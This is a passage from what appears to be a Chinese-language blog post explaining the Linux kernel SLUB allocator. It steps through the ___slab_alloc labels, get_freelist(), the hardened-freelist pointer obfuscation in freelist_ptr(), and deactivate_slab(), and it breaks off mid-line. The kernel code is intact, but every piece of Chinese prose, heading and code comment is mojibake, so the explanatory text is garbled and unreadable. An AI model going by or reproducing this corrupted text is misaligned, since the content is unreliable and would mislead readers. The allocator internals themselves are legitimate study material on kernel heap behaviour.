class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab);<br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ node æœªä¸Šçº¿æˆ–æ²¡æœ‰ normal memoryï¼Œå¿½ç•¥ node çº¦æŸ</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘¡-redoï¼šè·å–-percpu-slab-gt-freelist"><a href="#â‘¡-redoï¼šè·å–-percpu-slab-gt-freelist" class="headerlink" title="â‘¡ redoï¼šè·å– percpu slab-&gt;freelist"></a>â‘¡ redoï¼šè·å– percpu slab-&gt;freelist</h4><p>æ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>redo</code> æ ‡ç­¾ï¼š</p><ul><li><p>è‹¥ percpu slab ä¸ä¸ºç©ºï¼Œåˆ¤æ–­ slab æ˜¯å¦å±äºæŒ‡å®šçš„èŠ‚ç‚¹ä¸”ä¸åˆ†é…æ ‡å¿—ä½åŒ¹é…ï¼Œè‹¥å¦ï¼Œåˆ™è·³è½¬åˆ° <code>deactivate_slab</code> æ ‡ç­¾</p></li><li><p>æ¥ä¸‹æ¥æ£€æŸ¥ slab æ˜¯å¦ä»ä¸ºåŸæ¥çš„ cpu slabï¼ˆå› ä¸ºæˆ‘ä»¬å¯èƒ½è¢«æŠ¢å ï¼‰ï¼Œè‹¥å¦ï¼Œåˆ™è·³è½¬å› <code>reread_slab</code></p></li><li><p>æ¥ä¸‹æ¥è·å– per-cpu çš„ freelistï¼Œè‹¥ä¸ä¸ºç©ºï¼Œåˆ™è·³è½¬åˆ° <code>load_freelist</code>ï¼Œå¦åˆ™<strong>è°ƒç”¨ <code>get_freelist()</code> è·å– slab çš„ freelist</strong></p></li><li><p>è‹¥ slab çš„ freelist ä»ä¸ºç©ºï¼Œå°† per-cpu freelist è®¾ä¸º NULLï¼Œè·å–ä¸‹ä¸€ä¸ª tidï¼Œå¹¶è·³è½¬åˆ° <code>new_slab</code> åˆ†é…æ–°çš„ slab</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ä¸Šé¢ç›¸åŒä½† node_match() ä¸º false åˆ™æ—©å·²è¯´æ˜ node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123;<br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬ç†åº”æœç´¢ä¸€ä¸ª PFMEMALLOC çš„ slab é¡µé¢ï¼Œä½†ç°åœ¨ï¼Œ</span><br><span class="hljs-comment"> * å½“é¡µé¢ç¦»å¼€ per-cpu åˆ†é…å™¨ï¼Œæˆ‘ä»¬æ­£åœ¨å¤±å» pfmemalloc ä¿¡æ¯</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* å¿…é¡»å†æ¬¡æ£€æŸ¥ c-&gt;slab ä»¥å…æˆ‘ä»¬è¢«æŠ¢å ä½¿å…¶å‘ç”Ÿäº†æ›´æ”¹ */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!freelist) &#123;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br><br>stat(s, ALLOC_REFILL);<br></code></pre></td></tr></table></figure><p><code>get_freelist()</code> å‡½æ•°ä¸»è¦å°±æ˜¯è·å– <code>slab-&gt;freelist</code> åå°† <code>slab-&gt;freelist</code> è®¾ä¸º NULL å¹¶è¿”å›åŸæ¥çš„ freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ£€æŸ¥ slab-&gt;freelist å¹¶å°† freelist ä¼ é€ç»™ percpu freelist</span><br><span class="hljs-comment"> * æˆ–æ˜¯å°† slab ç»™ deactivate.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¿”å›å€¼é NULL åˆ™ slab ä»è¢«å†»ç»“.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¯¥å‡½æ•°è¿”å› NULL åˆ™ slab è¢«è§£å†».</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="â‘¢-load-freelistï¼šä»-freelist-åˆ†é…å¯¹è±¡"><a href="#â‘¢-load-freelistï¼šä»-freelist-åˆ†é…å¯¹è±¡" class="headerlink" title="â‘¢ load_freelistï¼šä» freelist åˆ†é…å¯¹è±¡"></a>â‘¢ load_freelistï¼šä» freelist åˆ†é…å¯¹è±¡</h4><p>ç»§ç»­è¿”å› <code>___slab_alloc()</code> ä¸­ï¼Œæ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>load_freelist</code> æ ‡ç­¾ï¼Œä¸»è¦å°±æ˜¯è°ƒç”¨ <code>get_freepointer()</code> å°† percpu freelist æŒ‡å‘ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡ï¼Œå¹¶è·å–ä¸‹ä¸€ä¸ª tid åè¿”å›å‰é¢è·å–çš„ freelistï¼ˆä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist æŒ‡å‘è¦è¢«ä½¿ç”¨çš„å¯¹è±¡é“¾è¡¨. slab æŒ‡å‘è·å¾—å¯¹è±¡çš„ slab.</span><br><span class="hljs-comment"> * å› æ­¤ slab å¿…é¡»è¢«å†»ç»“ä»¥è®© percpu çš„åˆ†é…æ­£å¸¸å·¥ä½œ.</span><br><span class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist);<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åœ¨ <code>get_freepointer()</code> é‡Œå¥—äº†ä¸¤å±‚ï¼Œæœ€åä¼šè°ƒç”¨åˆ° <code>freelist_ptr()</code> è·å–åˆ°ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å½“å¼€å¯äº† Hardened freelist ä¿æŠ¤ååœ¨ next æŒ‡é’ˆçš„ä½ç½®å­˜æ”¾çš„æ˜¯ <strong>ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡åœ°å€ ^ ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡åœ°å€ ^ ä¸€ä¸ªéšæœºå€¼</strong>ï¼ˆ<code>kmem_cache-&gt;random</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¿”å› freelist æŒ‡é’ˆ (ptr). åœ¨æœ‰åŠ å›ºçš„æƒ…å†µä¸‹å…¶é€šè¿‡ä¸€ä¸ª</span><br><span class="hljs-comment"> * å¯¹å­˜å‚¨æŒ‡é’ˆçš„åœ°å€ä¸ per-cache éšæœºå€¼çš„å¼‚æˆ–è¿›è¡Œæ··æ·†.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“å¼€å¯äº† CONFIG_KASAN_SW/HW_TAGS, ptr_addr å¯èƒ½è¢«æ‰“ä¸Šæ ‡ç­¾.</span><br><span class="hljs-comment"> * é€šå¸¸è¿™ä¸ä¼šé€ æˆä»»ä½•é—®é¢˜ï¼Œå› ä¸º set_freepointer() ä¸ get_freepointer() </span><br><span class="hljs-comment"> * è°ƒç”¨æ—¶éƒ½ä¼šæœ‰æ ‡ç­¾ç›¸åŒçš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> * ä½†æ˜¯ CONFIG_SLUB_DEBUG çš„ä»£ç æœ‰äº›é—®é¢˜. ä¾‹å¦‚å½“ __free_slub() åœ¨</span><br><span class="hljs-comment"> * ä¸€ä¸ª cache ä¸­è¿­ä»£å¯¹è±¡æ—¶,å…¶å°†æ²¡æœ‰æ ‡ç­¾çš„æŒ‡é’ˆä¼ ç»™ check_object(). </span><br><span class="hljs-comment"> * check_object() ä¾æ¬¡å¸¦ç€ä¸€ä¸ªæ²¡æœ‰æ ‡ç­¾çš„æŒ‡é’ˆè°ƒç”¨ get_freepointer()ï¼Œ</span><br><span class="hljs-comment"> * ä»è€Œé€ æˆ freepointer å­˜å‚¨é”™è¯¯.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>swab((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º <strong>slab-&gt;freelist æ˜¯æ²¡æœ‰åŠ å¯†çš„ï¼Œä½†é“¾è¡¨ä¸Šçš„åç»­æŒ‡é’ˆéƒ½æ˜¯åŠ å¯†äº†çš„</strong></p><h4 id="â‘£-deactivate-slabï¼šdeactivate-percpu-slab"><a href="#â‘£-deactivate-slabï¼šdeactivate-percpu-slab" class="headerlink" title="â‘£ deactivate_slabï¼šdeactivate percpu slab"></a>â‘£ deactivate_slabï¼šdeactivate percpu slab</h4><p>ç»§ç»­è¿”å› <code>___slab_alloc()</code> ä¸­ï¼Œæ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>deactivate_slab</code> æ ‡ç­¾ï¼Œé¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹åœ°æ£€æŸ¥æ˜¯å¦è¢«æŠ¢å è°ƒåº¦åˆ°äº†åˆ«çš„ CPUï¼Œè‹¥æ˜¯åˆ™è·³è½¬å› <code>reread_slab</code>ï¼›ä¹‹åå°±æ˜¯ç®€å•åœ°å°† percpu çš„ slab å’Œ freelist è®¾ä¸º NULL å¹¶è·å–ä¸‹ä¸€ä¸ª tidï¼Œä¹‹åè°ƒç”¨ <code>deactivate_slab()</code> å°†è¿™å¼  slab ç»™ deactivate äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist);<br></code></pre></td></tr></table></figure><p><code>deactivate_slab()</code> çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>éå† freelist æ£€æŸ¥æ˜¯å¦è¢«ç ´åï¼Œæ”¾å¼ƒè¢«ç ´åçš„éƒ¨åˆ†</li><li>å°† <code>slab-&gt;freelist</code> è®¾ä¸ºåŸ <code>kmem_cache_cpu-&gt;freelist</code>ï¼Œè‹¥ slab ä¸ŠåŸæœ‰ freelist ä¸ä¸º NULL åˆ™å†æ¥åˆ°åé¢</li><li>è®¾ç½® slab çš„ countersï¼Œå…¶ä¸­<strong>å°† <code>frozen</code> è®¾ä¸º 0</strong></li><li>è‹¥ slab ä¸Šçš„å¯¹è±¡å…¨éƒ¨ç©ºé—²**ä¸” node çš„ partial slab æ•°é‡å¤§äº <code>kmem_cache-&gt;min_partial</code>**ï¼Œè°ƒç”¨ <code>discard_slab()</code> å°† slab é‡Šæ”¾</li><li>è‹¥ slab ä¸Šå­˜åœ¨ç©ºé—²å¯¹è±¡ï¼Œè°ƒç”¨ <code>add_partial()</code> å°†å…¶åŠ å…¥ node çš„ partial é“¾è¡¨</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç»“æŸç§»é™¤ cpu slab. åˆå¹¶ cpu&#x27;s freelist ä¸ slab&#x27;s freelist,</span><br><span class="hljs-comment"> * è§£å†» slabs å¹¶æ”¾åœ¨åˆé€‚çš„é“¾è¡¨ä¸Š.</span><br><span class="hljs-comment"> * å‡è®¾ slab å·²ç»è¢«è°ƒç”¨è€…å®‰å…¨åœ°ä» kmem_cache_cpu ä¸Šå–ä¸‹.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é˜¶æ®µä¸€: ç»Ÿè®¡ cpu&#x27;s freelist ä¸Šçš„å¯¹è±¡æ•°é‡ï¼ˆfree_deltaï¼‰ </span><br><span class="hljs-comment"> * å¹¶ä¿å­˜æœ€åä¸€ä¸ªå¯¹è±¡ï¼ˆfreelist_tailï¼‰ ç”¨äºåé¢çš„æ‹¼æ¥.</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ &#x27;nextfree&#x27; æ— æ•ˆ, åœ¨ &#x27;freelist_iter&#x27; ä¸Šçš„å¯¹è±¡å¯èƒ½å·²è¢«ç ´å.</span><br><span class="hljs-comment"> * æ•…é€šè¿‡ç•¥è¿‡ &#x27;freelist_iter&#x27; èµ·çš„æ‰€æœ‰å¯¹è±¡æ¥è¿›è¡Œéš”ç¦».</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é˜¶æ®µäºŒ: è§£å†»slabå¹¶å°†per-cpu freelistæ‹¼æ¥åˆ°slab&#x27;s freelistå¤´éƒ¨.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç¡®ä¿é“¾è¡¨çš„å­˜åœ¨åæ˜ äº†åœ¨è§£å†»æœŸé—´å®é™…çš„å¯¹è±¡æ•°é‡æ—¶ï¼Œslab å·²è¢«è§£å†».</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬é¦–å…ˆåœ¨æŒæœ‰é”çš„æƒ…å†µä¸‹è¿›è¡Œcompxchgå¹¶å½“å…¶æˆåŠŸæ—¶å°† slab æ’å…¥é“¾è¡¨.</span><br><span class="hljs-comment"> * è‹¥æœ‰ä¸åŒ¹é…çš„æƒ…å†µåˆ™ slab ä¸ºæœªå†»ç»“ä¸” slab ä¸Šçš„æ•°é‡å¯èƒ½å‘ç”Ÿäº†æ”¹å˜.</span><br><span class="hljs-comment"> * é‡Šæ”¾é”å¹¶å†æ¬¡é‡è¯• cmpxchg.</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* ç¡®å®š slab çš„ç›®æ ‡çŠ¶æ€ */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;<br>mode = M_FREE;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æŒæœ‰è‡ªæ—‹é”æ¶ˆé™¤äº†acquire_slab()çœ‹åˆ°ä¸€ä¸ªslabä¸ºå†»ç»“çš„å¯èƒ½æ€§</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘£-new-slabï¼šè·å–-percpu-partial-slab"><a href="#â‘£-new-slabï¼šè·å–-percpu-partial-slab" class="headerlink" title="â‘£ new_slabï¼šè·å– percpu partial slab"></a>â‘£ new_slabï¼šè·å– percpu partial slab</h4><p>æ¥ä¸‹æ¥æ˜¯ <code>new_slab</code> æ ‡ç­¾ï¼Œä¸»è¦å°±æ˜¯æ£€æŸ¥è‹¥æœ‰ percpu partial slab åˆ™ä» percpu partial é“¾è¡¨ä¸Šè·å–ä¸€ä¸ª slab å°†å…¶è®¾ä¸º percpu slab å å†è·³è½¬å› <code>redo</code> æ ‡ç­¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123;<span class="hljs-comment">//æœ‰ percpu partial slab</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, 